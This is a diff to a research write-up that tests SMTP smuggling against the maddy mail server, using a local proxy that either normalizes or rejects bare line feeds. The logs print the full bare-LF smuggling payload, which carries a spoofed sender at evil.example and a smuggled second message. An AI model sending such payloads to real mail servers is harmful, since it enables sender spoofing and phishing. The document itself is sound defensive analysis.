@@ -849,7 +849,7 @@ The envelope reset between transactions is `go-smtp`'s `Conn.reset` (`conn.go:L6
 
 A small, hardened stdlib TCP proxy (`/tmp/maddy-smtp/proxy.py`, full source in §7) sits in front of maddy on `127.0.0.1:2524 -> 127.0.0.1:2525`, in two modes. The **same** ambiguous bare-LF smuggling payload from Q3 is routed through each. The proxy is **instrumented**: for every chunk it logs the byte range `[start..end)`, the event (`FORWARDED` / `NORMALIZED` / `REJECTED`), and on rejection the exact `offset` of the first bare LF and the running `forwarded_prefix_bytes`. It validates its mode argument (unknown modes abort rather than fail open), uses a `mktemp -d` 0700 working dir, bounds its scan buffer, sets socket deadlines, and cleans up in a `finally` block.
 
-**Proxy lifecycle (PID / readiness / shutdown).** Each proxy run captures its PID, waits for listener readiness, runs two correlated experiment runs, then is shut down by that exact PID:
+**Proxy lifecycle (PID / readiness / shutdown).** Each proxy run captures its PID, waits for listener readiness, runs two correlated experiment runs, then is shut down by that exact PID (this is the general pattern; each experiment below states its own exact `proxy.py <mode>` and `rawclient.py <mode>` invocation, which is what determines its result):
 ```bash
 nohup python3 /tmp/maddy-smtp/proxy.py reject 2524 127.0.0.1 2525 /tmp/maddy-smtp/proxy.log > /tmp/maddy-smtp/proxy_stderr.log 2>&1 &
 PROXY_PID=$!; echo "$PROXY_PID" > /tmp/maddy-smtp/proxy.pid
@@ -862,6 +862,9 @@ Readiness is independently confirmed by the proxy log's first line (which also r
 
 **Q5a — normalize (bare `\n` -> `\r\n`): the smuggle boundary is MANUFACTURED.** **Mechanism:** rewriting every bare `\n` to `\r\n` turns the first transaction's bare-LF `<LF>.<LF>` into a canonical `<CRLF>.<CRLF>` before maddy sees it. **Effect (observed): the smuggle is not prevented — it is *manufactured* into a fully canonical boundary,** so maddy still delivers two messages including the spoofed one. This is the "clean-up" front-end (the Cisco-normalizes-bare-LF analogue) that can *create* an unambiguous smuggling boundary out of ambiguous input. The instrumented proxy log shows the rewrite as one event — the input `<LF>.<LF>` becomes output `<CRLF>.<CRLF>`, lengthening the stream from 325 to 327 bytes:
 ```text
+$ # command (Q5a normalize) - start the normalize proxy, then route the SAME Q3 payload through it (run twice), then stop the proxy by its PID:
+$ nohup python3 /tmp/maddy-smtp/proxy.py normalize 2524 127.0.0.1 2525 /tmp/maddy-smtp/proxy.log >/tmp/maddy-smtp/proxy_stderr.log 2>&1 & PROXY_PID=$!; wait_port 2524
+$ python3 /tmp/maddy-smtp/rawclient.py smuggle 127.0.0.1 2524          # x2 through the proxy; then: kill "$PROXY_PID"
 $ # proxy (pid=93933): the single c->s NORMALIZED event (note in=...<LF>.<LF>... vs out=...<CRLF>.<CRLF>...):
 proxy[normalize pid=93933] c->s bytes [0..325) NORMALIZED in=325 out=327: in=EHLO client.test<CR><LF>MAIL FROM:<legit@example.com><CR><LF>RCPT TO:<rcpt@example.com><CR><LF>DATA<CR><LF>Subject: first (legit) message<CR><LF><CR><LF>This is the visible first message body.<LF>.<LF>MAIL FROM:<SPOOFED-attacker@evil.example><CR><LF>RCPT TO:<victim@example.com><CR><LF>DATA<CR><LF>Subject: SMUGGLED second message<CR><LF><CR><LF>This body was smuggled past the DATA boundary.<CR><LF>.<CR><LF> | out=EHLO client.test<CR><LF>MAIL FROM:<legit@example.com><CR><LF>RCPT TO:<rcpt@example.com><CR><LF>DATA<CR><LF>Subject: first (legit) message<CR><LF><CR><LF>This is the visible first message body.<CR><LF>.<CR><LF>MAIL FROM:<SPOOFED-attacker@evil.example><CR><LF>RCPT TO:<victim@example.com><CR><LF>DATA<CR><LF>Subject: SMUGGLED second message<CR><LF><CR><LF>This body was smuggled past the DATA boundary.<CR><LF>.<CR><LF>
 
@@ -882,6 +885,9 @@ ENVELOPE MAIL FROM:<SPOOFED-attacker@evil.example> BODY=8BITMIME
 
 *Case 1 — single chunk* (the whole payload arrives in one `send()`): the proxy finds the bare LF before forwarding anything, so `forwarded_prefix_bytes=0` and maddy sees only its `220` greeting:
 ```text
+$ # command (Q5b reject, single chunk) - start the reject proxy, then send the payload in ONE send():
+$ nohup python3 /tmp/maddy-smtp/proxy.py reject 2524 127.0.0.1 2525 /tmp/maddy-smtp/proxy.log >/tmp/maddy-smtp/proxy_stderr.log 2>&1 & PROXY_PID=$!; wait_port 2524
+$ python3 /tmp/maddy-smtp/rawclient.py smuggle 127.0.0.1 2524          # one send() -> proxy rejects at offset 156 before forwarding: forwarded_prefix_bytes=0
 $ # proxy (pid=94368, single-chunk): whole payload rejected, nothing forwarded:
 proxy[reject pid=94368] listening 127.0.0.1:2524 -> 127.0.0.1:2525 (log=/tmp/maddy-smtp/proxy.log)
 proxy[reject pid=94368] c->s bytes [0..325) REJECTED (bare LF at offset 156); NOT forwarded: EHLO client.test<CR><LF>MAIL FROM:<legit@example.com><CR><LF>RCPT TO:<rcpt@example.com><CR><LF>DATA<CR><LF>Subject: first (legit) message<CR><LF><CR><LF>This is the visible first message body.<LF>.<LF>MAIL FROM:<SPOOFED-attacker@evil.example><CR><LF>RCPT TO:<victim@example.com><CR><LF>DATA<CR><LF>Subject: SMUGGLED second message<CR><LF><CR><LF>This body was smuggled past the DATA boundary.<CR><LF>.<CR><LF>
@@ -897,6 +903,8 @@ $ # client: greeting, then the proxy's 500 on the first bare LF:
 
 *Case 2 — split chunks* (the client flushes a prefix before the bare LF): the proxy forwards the clean 156-byte prefix (`EHLO`…`DATA`…first body line), so maddy processes `EHLO` -> `250`s -> `incoming` -> `354`; then the proxy rejects bytes `[156..325)` and closes, so maddy sees an **unexpected EOF** and aborts. `forwarded_prefix_bytes=156`, but the sink **still** delivers zero:
 ```text
+$ # command (Q5b reject, split chunks) - SAME reject proxy; the smuggle-split mode flushes the clean 156-byte prefix, pauses, then sends the bare-LF tail as a 2nd chunk:
+$ python3 /tmp/maddy-smtp/rawclient.py smuggle-split 127.0.0.1 2524    # two sends -> proxy forwards the clean prefix first: forwarded_prefix_bytes=156
 $ # proxy (pid=94800, split-chunk): clean 156-byte prefix FORWARDED, then bytes [156..325) REJECTED:
 proxy[reject pid=94800] listening 127.0.0.1:2524 -> 127.0.0.1:2525 (log=/tmp/maddy-smtp/proxy.log)
 proxy[reject pid=94800] c->s bytes [0..156) clean, FORWARDED (156): EHLO client.test<CR><LF>MAIL FROM:<legit@example.com><CR><LF>RCPT TO:<rcpt@example.com><CR><LF>DATA<CR><LF>Subject: first (legit) message<CR><LF><CR><LF>This is the visible first message body.
@@ -917,6 +925,8 @@ So the reject proxy's *effect on maddy's progress* is packetization-dependent (n
 
 **Control — a canonical message through the reject proxy passes (selectivity).** A fully-canonical message (no bare newlines) is forwarded chunk-by-chunk and delivered normally, confirming the proxy blocks only ambiguous framing, not all traffic:
 ```text
+$ # command (Q5b reject, canonical control) - SAME reject proxy; a fully-canonical message (no bare newlines):
+$ python3 /tmp/maddy-smtp/rawclient.py canonical 127.0.0.1 2524        # no bare LF -> forwarded chunk-by-chunk -> 1 delivered
 $ # proxy (pid=95231): every clean chunk FORWARDED (EHLO/MAIL/RCPT/DATA/body/.CRLF/QUIT):
 proxy[reject pid=95231] listening 127.0.0.1:2524 -> 127.0.0.1:2525 (log=/tmp/maddy-smtp/proxy.log)
 proxy[reject pid=95231] c->s bytes [0..18) clean, FORWARDED (18): EHLO client.test<CR><LF>
@@ -1055,7 +1065,7 @@ delivered body (unstuffed, 5201 bytes)
 ```text
 $ # (A) WRONG — broadened with --include=*.md; it matches THIS document, so it returns matches (exit 0), NOT exit 1:
 $ grep -rniE --include=*.md 'smuggl' . | wc -l
-61   # self-referential count (every match is inside THIS document); the integer drifts with any edit to this file, so the meaningful signal is the exit code below, not the count
+65   # self-referential count (every match is inside THIS document); the integer drifts with any edit to this file, so the meaningful signal is the exit code below, not the count
 $ grep -rniE --include=*.md 'smuggl' . ; echo "exit=$?"
 exit=0   # 0 = matched, because blitzy/documentation/maddy_26452dd8dd78.md itself contains 'smuggling'
 $ # (B) CORRECT — scope to the canonical maddy SOURCE + top-level config only:
